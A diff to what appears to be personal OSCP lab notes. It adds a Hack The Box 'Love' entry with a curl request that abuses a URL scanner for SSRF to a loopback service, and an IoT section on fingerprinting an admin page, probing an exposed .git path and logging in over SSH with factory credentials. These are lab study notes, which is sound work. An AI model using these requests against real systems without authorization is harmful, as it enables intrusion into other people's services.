@@ -760,6 +760,28 @@ See [[27. Assembling the Pieces|AEN.3 Q6 (tracking.inlanefreight.local)]] for th
 
 ---
 
+## Love: SSRF from a URL scanner to an internal HTTP service
+
+When a staging virtual host exposes a URL scanner, test whether it can fetch the protected HTTP service bound to loopback. Keep the public host and the internal destination explicit so the request is reproducible and the response is easy to save for review.
+
+```bash
+boxset VHost "staging.love.htb"
+
+curl -sS --resolve "$VHost:$WebPort:$BoxIP" \
+  "http://$VHost:$WebPort/" | tee "$BoxDir/loot/staging-root.txt"
+
+curl -sS --resolve "$VHost:$WebPort:$BoxIP" \
+  -X POST --data-urlencode 'file=http://127.0.0.1:5000/' \
+  --data-urlencode 'read=Scan file' \
+  "http://$VHost:$WebPort/beta.php" | tee "$BoxDir/loot/ssrf-5000.txt"
+```
+
+The scanner’s response can disclose an internal admin page or other sensitive material. Preserve the raw response only in the local loot directory, redact credentials from notes, and use the disclosed route to continue with authenticated application testing. Review [[OSCP/BOXES/WRITE UPS/Windows/Love|Love]].
+
+#### Tags: #SSRF #VirtualHost #InternalService #URLScanner #SensitiveDataExposure
+
+---
+
 ## **Outstanding**
 This area grows alongside the modules. The current follow-up is to add Drupal, Joomla, and Tomcat Manager entries when their source material is written. Each entry belongs in this appendix under the matching application heading and must link back to its module source.
 ## External Resources
@@ -784,6 +806,47 @@ This page turns one repeatable part of an authorized assessment into a checklist
 - [[OSCP/BOXES/WRITE UPS/Linux/Poison|Poison]] -- custom PHP file parameter, LFI source review, and safe handling of encoded credential material
 - [[OSCP/BOXES/WRITE UPS/Linux/TartarSauce|TartarSauce]] -- robots/Gobuster triage, aggressive WPScan plugin discovery, and Gwolle RFI validation
 - [[OSCP/BOXES/WRITE UPS/Linux/DevOops|DevOops]] -- multipart XML XXE, source-driven Python pickle proof, SSH-key extraction, and Git-history credential hunting
+- [[OSCP/BOXES/WRITE UPS/Linux/Mirai|Mirai]] -- Pi-hole fingerprinting, `/admin/` discovery, exposed web metadata, and controlled IoT credential validation
+- [[OSCP/BOXES/WRITE UPS/Windows/Love|Love]] -- staging virtual-host routing, URL-scanner SSRF to loopback, and authenticated Voting System upload
+
+## IoT product fingerprint and default-credential validation
+
+When a web response identifies an appliance or embedded product, save the headers and management page before testing credentials. A 404 can still be a useful fingerprint if its headers name the product.
+
+```bash
+curl -sS -i "http://$BoxIP:$WebPort/" \
+  | tee "$BoxDir/loot/http-root.txt"
+curl -sS -L "http://$BoxIP:$WebPort/admin/" \
+  | tee "$BoxDir/loot/http-admin.html"
+grep -Ein 'product|version|firmware|login|admin|pi-hole' \
+  "$BoxDir/loot/http-root.txt" "$BoxDir/loot/http-admin.html"
+curl -sS "http://$BoxIP:$WebPort/admin/.git/HEAD" \
+  | tee "$BoxDir/loot/application-git-head.txt"
+```
+
+Set the account name from the product evidence and enter any authorised factory credential privately at the SSH prompt. Do not place the value in the command line, shell history, or report.
+
+```bash
+ssh -o PreferredAuthentications=password \
+  -o PubkeyAuthentication=no \
+  -p "$SshPort" "$Username@$BoxIP"
+id
+whoami
+hostname
+```
+
+If local enumeration exposes removable media, record metadata without opening completion files:
+
+```bash
+mount | grep -E '/media|/mnt|/dev/sd'
+lsblk -f
+df -h
+ls -la "$UsbMount"
+file -s "$UsbDevice"
+stat "$UsbMount"/* 2>/dev/null
+```
+
+The detailed decision path is [[OSCP/RUNBOOK V2/Linux - IoT Default Credentials|Linux - IoT Default Credentials]].
 
 ## WordPress plugin discovery and Gwolle RFI
 
